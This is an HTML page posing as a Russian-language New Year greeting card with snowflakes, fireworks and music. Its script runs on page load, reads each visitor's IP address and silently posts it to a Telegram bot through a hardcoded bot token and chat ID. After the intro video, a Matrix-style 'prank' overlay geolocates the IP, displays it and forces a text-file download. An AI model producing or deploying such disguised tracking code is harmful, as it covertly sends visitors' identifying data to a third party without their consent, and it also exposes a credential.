<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–° –ù–æ–≤—ã–º –ì–æ–¥–æ–º!</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <video id="introVideo" src="https://www.dropbox.com/scl/fi/mkuisyuukbh5op0r0rwqs/VID_20241220_215553_109.mp4?rlkey=4fejgx775xvwx1j293sp0ipl0&dl=1" autoplay></video>
    <audio id="bgMusic" src="https://www.dropbox.com/scl/fi/83fpumn4kokzi42sl8ld3/Subway-Surfers-Soundtrack-_-Winter-Wonderland-2024-SmCbmDQKQTQ.mp3?rlkey=2d6xc19ourwjquqhgsiiz1cn9&st=kkclxuoc&dl=1" loop preload="auto"></audio>
    <audio id="prankMusic" src="https://www.dropbox.com/scl/fi/9gae1djzw4w60svonjo2i/clubbed-to-death-Matrix-soundtrack.mp3?rlkey=0w103p6213ammaqdvugxwx5hz&st=bvmh43qh&dl=1" preload="auto"></audio>
    <button id="musicControl" class="music-button">
        <i class="fas fa-music"></i>
    </button>
    <div class="background">
        <div class="gradient-overlay"></div>
    </div>
    <div class="snowflakes" aria-hidden="true"></div>
    <div class="ornaments-container">
        <div class="ornament" style="--i:1;"></div>
        <div class="ornament" style="--i:2;"></div>
        <div class="ornament" style="--i:3;"></div>
        <div class="ornament" style="--i:4;"></div>
        <div class="ornament" style="--i:5;"></div>
        <div class="ornament" style="--i:6;"></div>
    </div>
    <div class="content">
        <h1>–° –ù–æ–≤—ã–º –ì–æ–¥–æ–º!</h1>
        <p>–ü—É—Å—Ç—å —ç—Ç–æ—Ç –≥–æ–¥ –ø—Ä–∏–Ω–µ—Å–µ—Ç —Ç–µ–±–µ –º–Ω–æ–≥–æ —Å—á–∞—Å—Ç—å—è –∏ —Ä–∞–¥–æ—Å—Ç–∏.</p>
        <div class="buttons">
            <button class="effect-button" data-effect="firework">–°–∞–ª—é—Ç</button>
            <button class="effect-button" data-effect="sparkle">–ò—Å–∫—Ä—ã</button>
            <button class="effect-button" data-effect="snow">–°–Ω–µ–≥</button>
        </div>
    </div>
    <canvas id="fireworksCanvas"></canvas>
    <div id="prankOverlay" class="prank-overlay" style="display: none;">
        <canvas id="matrixPrankCanvas"></canvas>
        <canvas id="mapCanvas"></canvas>
        <div id="prankMessages" class="prank-messages">
            <p id="ipMessage"></p>
        </div>
    </div>

    <script>
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) throw new Error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP');
                const data = await response.json();
                const userIP = data.ip;
                console.log('IP –ø–æ–ª—É—á–µ–Ω:', userIP);
                document.getElementById('ipMessage').innerText = `–í–∞—à IP: ${userIP}`;
                sendToTelegram(userIP);
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error);
                document.getElementById('ipMessage').innerText = '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP';
            }
        }

        async function sendToTelegram(ip) {
            const botToken = '7782381480:AAHdXZ5NZEtdnrABPLy2VZrnA_itGnWzWeA';
            const chatId = '7053021049';
            const message = `–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!\nüåê IP: ${ip}`;
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message }),
                });
                if (response.ok) {
                    console.log('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!');
                } else {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', response.statusText);
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const introVideo = document.getElementById('introVideo');
            const bgMusic = document.getElementById('bgMusic');
            const prankMusic = document.getElementById('prankMusic');
            bgMusic.volume = 0.5;
            prankMusic.volume = 1.0;
            const musicControl = document.getElementById('musicControl');
            let isPlaying = false;
            musicControl.addEventListener('click', () => {
                if (isPlaying) {
                    bgMusic.pause();
                    musicControl.innerHTML = '<i class="fas fa-music"></i>';
                    musicControl.classList.remove('playing');
                } else {
                    bgMusic.play();
                    musicControl.innerHTML = '<i class="fas fa-pause"></i>';
                    musicControl.classList.add('playing');
                }
                isPlaying = !isPlaying;
            });
            const snowflakesContainer = document.querySelector('.snowflakes');
            const snowflakeSymbols = ['‚ùÖ', '‚ùÜ', '‚ùÑ'];
            const numberOfSnowflakes = 100;
            for (let i = 0; i < numberOfSnowflakes; i++) {
                const snowflake = document.createElement('div');
                snowflake.classList.add('snowflake');
                snowflake.textContent = snowflakeSymbols[Math.floor(Math.random() * snowflakeSymbols.length)];
                snowflake.style.left = `${Math.random() * 100}%`;
                snowflake.style.animationDuration = `${Math.random() * 5 + 10}s`;
                snowflake.style.fontSize = `${Math.random() * 1.5 + 0.5}em`;
                snowflake.style.opacity = Math.random();
                snowflakesContainer.appendChild(snowflake);
            }
            const buttons = document.querySelectorAll('.effect-button');
            buttons.forEach(button => {
                button.addEventListener('click', () => {
                    const effect = button.getAttribute('data-effect');
                    if (effect === 'firework') {
                        createFirework();
                    } else if (effect === 'sparkle') {
                        createSparkle();
                    } else if (effect === 'snow') {
                        createSnow();
                    }
                });
            });
            function createSparkle() {
                const sparkle = document.createElement('div');
                sparkle.classList.add('sparkle');
                sparkle.style.left = `${Math.random() * 100}%`;
                sparkle.style.top = `${Math.random() * 100}%`;
                sparkle.style.animationDuration = `${Math.random() * 0.5 + 0.5}s`;
                document.body.appendChild(sparkle);
                sparkle.addEventListener('animationend', () => {
                    sparkle.remove();
                });
            }
            function createSnow() {
                const snowflake = document.createElement('div');
                snowflake.classList.add('snowflake');
                snowflake.textContent = snowflakeSymbols[Math.floor(Math.random() * snowflakeSymbols.length)];
                snowflake.style.left = `${Math.random() * 100}%`;
                snowflake.style.animationDuration = `${Math.random() * 5 + 10}s`;
                snowflake.style.fontSize = `${Math.random() * 1.5 + 0.5}em`;
                snowflake.style.opacity = Math.random();
                snowflakesContainer.appendChild(snowflake);
                snowflake.addEventListener('animationend', () => {
                    snowflake.remove();
                });
            }
            const canvas = document.getElementById('fireworksCanvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
            class Firework {
                constructor(x, y, targetY) {
                    this.x = x;
                    this.y = y;
                    this.targetY = targetY;
                    this.speed = Math.random() * 3 + 2;
                    this.angle = Math.random() * Math.PI * 2;
                    this.hue = Math.random() * 360;
                    this.particles = [];
                    this.exploded = false;
                }
                update() {
                    if (!this.exploded) {
                        this.y -= this.speed;
                        if (this.y <= this.targetY) {
                            this.explode();
                            this.exploded = true;
                        }
                    }
                    this.particles.forEach(particle => particle.update());
                    this.particles = this.particles.filter(particle => !particle.isDead());
                }
                explode() {
                    const particleCount = 100;
                    for (let i = 0; i < particleCount; i++) {
                        this.particles.push(new Particle(this.x, this.y, this.hue));
                    }
                }
                draw(ctx) {
                    if (!this.exploded) {
                        ctx.beginPath();
                        ctx.arc(this.x, this.y, 2, 0, Math.PI * 2);
                        ctx.fillStyle = `hsl(${this.hue}, 100%, 50%)`;
                        ctx.fill();
                    }
                    this.particles.forEach(particle => particle.draw(ctx));
                }
            }
            class Particle {
                constructor(x, y, hue) {
                    this.x = x;
                    this.y = y;
                    this.speed = Math.random() * 5 + 1;
                    this.angle = Math.random() * Math.PI * 2;
                    this.gravity = 0.05;
                    this.velocityX = Math.cos(this.angle) * this.speed;
                    this.velocityY = Math.sin(this.angle) * this.speed;
                    this.friction = 0.95;
                    this.hue = hue;
                    this.alpha = 1;
                    this.decay = Math.random() * 0.02 + 0.015;
                }
                update() {
                    this.velocityX *= this.friction;
                    this.velocityY *= this.friction;
                    this.velocityY += this.gravity;
                    this.x += this.velocityX;
                    this.y += this.velocityY;
                    this.alpha -= this.decay;
                }
                draw(ctx) {
                    ctx.save();
                    ctx.globalAlpha = this.alpha;
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, 2, 0, Math.PI * 2);
                    ctx.fillStyle = `hsl(${this.hue}, 100%, 50%)`;
                    ctx.fill();
                    ctx.restore();
                }
                isDead() {
                    return this.alpha <= 0;
                }
            }
            let fireworks = [];
            const maxFireworks = 1000;
            function animate() {
                ctx.globalCompositeOperation = 'destination-out';
                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.globalCompositeOperation = 'lighter';
                fireworks.forEach(firework => firework.update());
                fireworks.forEach(firework => firework.draw(ctx));
                fireworks = fireworks.filter(firework => !firework.exploded || firework.particles.length > 0);
                requestAnimationFrame(animate);
            }
            animate();
            window.addEventListener('click', (e) => {
                if (fireworks.length < maxFireworks) {
                    const x = e.clientX;
                    const y = canvas.height;
                    const targetY = Math.random() * canvas.height / 2;
                    fireworks.push(new Firework(x, y, targetY));
                }
            });
            setInterval(() => {
                if (fireworks.length < maxFireworks) {
                    const x = Math.random() * canvas.width;
                    const y = canvas.height;
                    const targetY = Math.random() * canvas.height / 2;
                    fireworks.push(new Firework(x, y, targetY));
                }
            }, 3000);
            function createFirework() {
                const x = Math.random() * canvas.width;
                const y = canvas.height;
                const targetY = Math.random() * canvas.height / 2;
                if (fireworks.length < maxFireworks) {
                    fireworks.push(new Firework(x, y, targetY));
                }
            }
            introVideo.addEventListener('ended', () => {
                introVideo.style.display = 'none';
                triggerMatrixPrank();
            });
            function triggerMatrixPrank() {
                const prankOverlay = document.getElementById('prankOverlay');
                const matrixPrankCanvas = document.getElementById('matrixPrankCanvas');
                const mapCanvas = document.getElementById('mapCanvas');
                const prankMessages = document.getElementById('prankMessages');
                prankOverlay.style.display = 'flex';
                setTimeout(() => {
                    prankOverlay.style.opacity = '1';
                }, 50);
                matrixPrankCanvas.width = window.innerWidth;
                matrixPrankCanvas.height = window.innerHeight;
                const ctxMatrix = matrixPrankCanvas.getContext('2d');
                const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
                const fontSize = 16;
                const columns = Math.floor(matrixPrankCanvas.width / fontSize);
                const drops = [];
                for (let i = 0; i < columns; i++) {
                    drops[i] = Math.random() * matrixPrankCanvas.height / fontSize;
                }
                const matrixInterval = setInterval(() => {
                    ctxMatrix.fillStyle = 'rgba(0, 0, 0, 0.05)';
                    ctxMatrix.fillRect(0, 0, matrixPrankCanvas.width, matrixPrankCanvas.height);
                    ctxMatrix.fillStyle = '#0F0';
                    ctxMatrix.font = `${fontSize}px monospace`;
                    for (let i = 0; i < drops.length; i++) {
                        const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
                        ctxMatrix.fillText(text, i * fontSize, drops[i] * fontSize);
                        if (drops[i] * fontSize > matrixPrankCanvas.height && Math.random() > 0.975) {
                            drops[i] = 0;
                        }
                        drops[i]++;
                    }
                }, 33);
                prankMusic.currentTime = 20;
                prankMusic.play().then(() => {
                    bgMusic.pause();
                }).catch((error) => {
                    console.log('–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–∏ prank –º—É–∑—ã–∫–∏:', error);
                });
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;
                        fetch(`https://ipapi.co/${ip}/json/`)
                            .then(response => response.json())
                            .then(location => {
                                const latitude = location.latitude;
                                const longitude = location.longitude;
                                displayMessages(ip, latitude, longitude, prankOverlay, matrixInterval);
                                downloadIPFile(ip);
                            })
                            .catch(error => {
                                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error);
                                displayMessages(ip, null, null, prankOverlay, matrixInterval);
                            });
                    })
                    .catch(error => {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP:', error);
                        displayMessages('–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å IP', null, null, prankOverlay, matrixInterval);
                    });
            }
            function displayMessages(ip, lat, lon, overlay, matrixInterval) {
                const ipMessage = document.getElementById('ipMessage');
                ipMessage.textContent = `–¢–≤–æ–π –∞–π–ø–∏: ${ip}`;
                ipMessage.style.opacity = '1';
                setTimeout(() => {
                }, 4000);
                setTimeout(() => {
                    clearInterval(matrixInterval);
                    const ctxMatrix = document.getElementById('matrixPrankCanvas').getContext('2d');
                    ctxMatrix.clearRect(0, 0, window.innerWidth, window.innerHeight);
                    overlay.style.opacity = '0';
                    setTimeout(() => {
                        overlay.style.display = 'none';
                        ipMessage.textContent = '';
                        prankMusic.pause();
                        prankMusic.currentTime = 0;
                        bgMusic.play();
                    }, 2000);
                }, 14000);
            }
            function downloadIPFile(ip) {
                const blob = new Blob([`–¢–≤–æ–π IP: ${ip}`], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'your_ip.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }
            getUserIP();
        });
    </script>
</body>
</html>
